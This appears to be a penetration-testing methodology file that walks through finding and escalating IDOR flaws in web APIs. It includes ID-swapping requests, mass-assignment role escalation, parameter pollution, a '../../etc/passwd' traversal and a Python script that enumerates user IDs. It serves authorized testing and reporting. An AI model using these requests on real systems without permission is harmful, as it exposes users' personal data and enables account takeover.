# Scenario: IDOR Discovery and Escalation Workflow

## Objective
Systematically test for Insecure Direct Object References across all CRUD operations, escalate from information disclosure to account takeover or data manipulation.

---

## Prerequisites
Create **two test accounts** (Account A and Account B) with the same privilege level.

---

## Phase 1: Map Object References

### Step 1: Identify all endpoints with object references
Browse the application as Account A with Burp proxy. Look for:
```
GET  /api/users/123
GET  /api/orders/456
GET  /api/invoices/789
POST /api/messages
GET  /download?file=report_123.pdf
GET  /profile?id=abc-def-123
```

### Step 2: Categorize the reference type

| Pattern | Type | Guessability |
|---------|------|-------------|
| `123`, `124`, `125` | Sequential integer | Very easy |
| `abc-def-123-456-789` | UUID | Hard (unless leaked) |
| `base64string==` | Encoded ID | Decode → modify → re-encode |
| `admin@target.com` | Email as ID | Known if you know the target |
| `5f4dcc3b5aa765d61d83` | Hashed ID | Crack or swap from another response |

---

## Phase 2: Horizontal IDOR Testing (Same Role)

### Step 3: Read operations (GET)
As Account A, capture a request to your own resource:
```
GET /api/users/100  → Account A's data
```
Replace with Account B's ID:
```
GET /api/users/101  → Account B's data returned? → IDOR!
```

### Step 4: Write operations (PUT/PATCH)
```
PUT /api/users/100 {"email": "a@test.com"}  → Updates A's email (normal)
PUT /api/users/101 {"email": "a@test.com"}  → Updates B's email? → IDOR!
```

### Step 5: Delete operations (DELETE)
```
DELETE /api/orders/200  → Deletes A's order (normal)
DELETE /api/orders/201  → Deletes B's order? → IDOR!
```

### Step 6: Create operations (POST)
```
POST /api/messages {"to": 101, "body": "hello"}  → Sends as A (normal)
POST /api/messages {"from": 101, "to": 100, "body": "hello"}  → Sends as B? → IDOR!
```

---

## Phase 3: Vertical IDOR Testing (Role Escalation)

### Step 7: Access admin resources
```
GET /api/users/1       → Admin user data leaked?
GET /api/admin/settings → Accessible as regular user?
GET /api/reports/all    → Admin-only report accessible?
```

### Step 8: Modify role via IDOR + mass assignment
```
PUT /api/users/100 {"role": "admin"}        → Privilege escalation?
PUT /api/users/100 {"is_admin": true}       → Alternative field?
PUT /api/users/100 {"group_id": 1}          → Admin group?
```

---

## Phase 4: Advanced Techniques

### Step 9: UUID leakage hunting
If IDs are UUIDs, find where they leak:
```
- API responses listing users (search, comments, public profiles)
- HTTP response headers
- WebSocket messages
- Error messages containing UUIDs
- JavaScript source files
- Previous API responses (user creation, invitation)
```

### Step 10: Encoded ID manipulation
```
# If ID is base64 encoded:
echo "user_id=100" | base64    → dXNlcl9pZD0xMDA=
echo "user_id=101" | base64    → dXNlcl9pZD0xMDE=

# Replace in request with the new encoded value
```

### Step 11: Parameter pollution
```
GET /api/profile?id=100&id=101         → Which ID does the server use?
GET /api/profile?id[]=100&id[]=101     → Array injection?
GET /api/profile?id=100,101            → Comma-separated?
POST /api/profile {"id": 100, "id": 101}  → JSON duplicate key?
```

### Step 12: HTTP method switching
```
GET  /api/users/101  → 403 Forbidden
POST /api/users/101  → 200 OK? Data returned?
PUT  /api/users/101  → 200 OK? Can modify?
```

### Step 13: Path traversal in object references
```
GET /api/users/100/../101
GET /download?file=invoice_100/../invoice_101
GET /download?file=../../etc/passwd
```

---

## Phase 5: Automated Testing

### Step 14: Use Autorize (Burp extension)
1. Install Autorize from BApp Store
2. Log in as Account B in a separate browser
3. Copy Account B's session cookie into Autorize
4. Browse as Account A — Autorize replays every request with B's cookie
5. Autorize highlights requests where B can access A's resources (IDOR!)

### Step 15: Custom script for ID iteration
```python
import requests

session = requests.Session()
session.cookies.set("session", "ACCOUNT_A_SESSION")

for user_id in range(1, 200):
    r = session.get(f"https://target.com/api/users/{user_id}")
    if r.status_code == 200:
        print(f"User {user_id}: {r.text[:100]}")
```

---

## Phase 6: Impact Documentation

### Step 16: Assess and report
| Finding | Severity |
|---------|----------|
| Read other users' public data | **Low** |
| Read other users' PII (email, address, phone) | **High** |
| Read other users' financial data | **Critical** |
| Modify other users' profile | **High** |
| Delete other users' resources | **High** |
| Account takeover via email change | **Critical** |
| Access admin functionality | **Critical** |

## Tools
- `Autorize` (Burp extension) — Automated IDOR detection
- `Burp Suite Repeater` — Manual testing
- Custom iteration scripts (Python, bash)
- `OWASP ZAP` — Access control scanning

## References
- `techniques/idor-insecure-direct-object-reference.md`
- `techniques/mass-assignment-vulnerabilities.md`
- `methodology/exploitation-methodology.md`
